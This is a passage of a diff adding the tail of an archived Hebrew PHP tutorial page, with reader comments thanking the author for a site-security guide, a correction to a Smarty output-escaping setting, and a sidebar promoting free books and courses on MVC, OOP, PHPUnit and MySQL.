+תודה רבה, עזר לי מאוד באבטחת האתר.</div>
+<a id="comment1220"></a>
+<div class="blog-comment">
+<span class='comment-author'>אנונימי</span><span dir="rtl">&nbsp;</span>
+<span dir="ltr" class='comment-date'>01/02/2012 13:42</span><br>
+מדריך מעולה!!! ממש תודה רבה</div>
+<a id="comment1370"></a>
+<div class="blog-comment">
+<span class='comment-author'>אנונימי</span><span dir="rtl">&nbsp;</span>
+<span dir="ltr" class='comment-date'>29/02/2012 00:01</span><br>
+מדריך מאוד מורחב ויפה.</div>
+<a id="comment1501"></a>
+<div class="blog-comment">
+<span class='comment-author'>אנונימי</span><span dir="rtl">&nbsp;</span>
+<span dir="ltr" class='comment-date'>21/04/2012 14:11</span><br>
+אחלה אתר אהבתי את המדריך</div>
+<a id="comment1753"></a>
+<div class="blog-comment">
+<span class='comment-author'>DaMan</span><span dir="rtl">&nbsp;</span>
+<span dir="ltr" class='comment-date'>12/07/2012 22:29</span><br>
+תודה רבה.<br>
+מדריך מעולה!</div>
+<a id="comment2271"></a>
+<div class="blog-comment">
+<span class='comment-author'>Ben</span><span dir="rtl">&nbsp;</span>
+<span dir="ltr" class='comment-date'>07/03/2013 17:13</span><br>
+אלכס, יהיה נחמד אם תתקן:<br>
+$smarty-&gt;default_modifiers = array(&apos;escape:htmlall&apos;);<br>
+<br>
+ל:<br>
+$smarty-&gt;default_modifiers = array(&apos;escape:&quot;htmlall&quot;&apos;);<br>
+<br>
+חסר לך שם גרש :).</div>
+<a id="comment2272"></a>
+<div class="blog-comment">
+<span class='comment-author'>intval</span><span dir="rtl">&nbsp;</span>
+<span dir="ltr" class='comment-date'>07/03/2013 17:15</span><br>
+תודה בן ותודה למי שתיקן את זה לפני :)</div>
+</section>
+</section>  
+<section id="sidebar">
+<section id="search_box">
+<form method="get" action="http://www.google.co.il/search" id="search_form">
+<input type="hidden" name="hl" value="iw">
+<input type="checkbox" name="sitesearch" style="display:none" value="https://phpguide.co.il" checked="">
+<input type="text" class="search_form" placeholder="חיפוש" name="q" id="search_field">
+<input type="submit" value="" title="לחפש">
+</form>
+</section>
+<style>.staticSidebarPageLinks a{color:#e85a2d;font-weight:bold;text-decoration:underline}</style>
+<div class='rblock staticSidebarPageLinks' style="padding:0 -50px; width:100%; background: white;">
+<a href="page_mvcebook.html" title="למד איך עובד MVC" onclick="Analytics.track('Promotion', 'click', 'GoToLanding', 'mvcebook-sidebar-banner1');">
+ספר חינם על MVC
+</a>
+שאתה הולך להוריד כי אם אתה רוצה ללמוד על ארגון קוד יעיל ומודרני באתרים כמו זה או פייסבוק או כי כולם אוהבים להוריד דברים איכותיים בחינם מהאינטרנט
+<br><br>
+<a href='page_oopbook.html'>
+ספר הלימוד - תכנות מונחה עצמים מאפס
+</a>
+שסוף סוף ילמד אותך פיתוח מונחה עצמים נכון בצורה פשוטה, יענה על כל השאלות ויכין אותך לרעיונות עבודה.
+<br><br>
+<a href='page_phpunit.html'>
+קורס בדיקות יחידה phpunit
+</a>
+שיעזור לך להקטין בחצי את כמות הבאגים, את כאב הראש והזמן המבוזבז על פתירתם
+<br><br>
+<a href='page_mysqlinteractive.html'>
+קורס mysql אינטרקטיבי
+</a>
+שיייקח אותך צעד אחר צעד למומחה שאילתות mysql לייב
+<br><br><br>
+<small>האתר ב-readonly
+<br>
+תודה לכל מי שתרם, ענה, שאל, כתב, לימד ועזר במשך השנים <br>
+orelbey, splash, raslin, cayce, iiddaannyy, michael, kingyes, ilikeme, itamarhadad, iosolidar, jbstyle<br>
+- alex@הדומיין הזה
+</small>
+</div>
+</section>
+</div>
+<footer id='footer'>
+</footer>
+</div>  
+<script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/angularjs/1.2.6/angular.min.js"></script>
+<script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/angularjs/1.2.6/angular-resource.min.js"></script>
+<script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/angularjs/1.2.6/angular-cookies.min.js"></script>
+<script type="text/javascript" src="assets\c2224fc8\jquery.min.js"></script>
+<script type="text/javascript" src="static\scripts\scripts.compiled.js"></script>
+<script type="text/javascript" src="static\scripts\plugins.js"></script>
+<script type="text/javascript" src="static\scripts\ui.js"></script>
+<script type="text/javascript" src="static\scripts\analytics.js"></script>
+</body>
+</html>
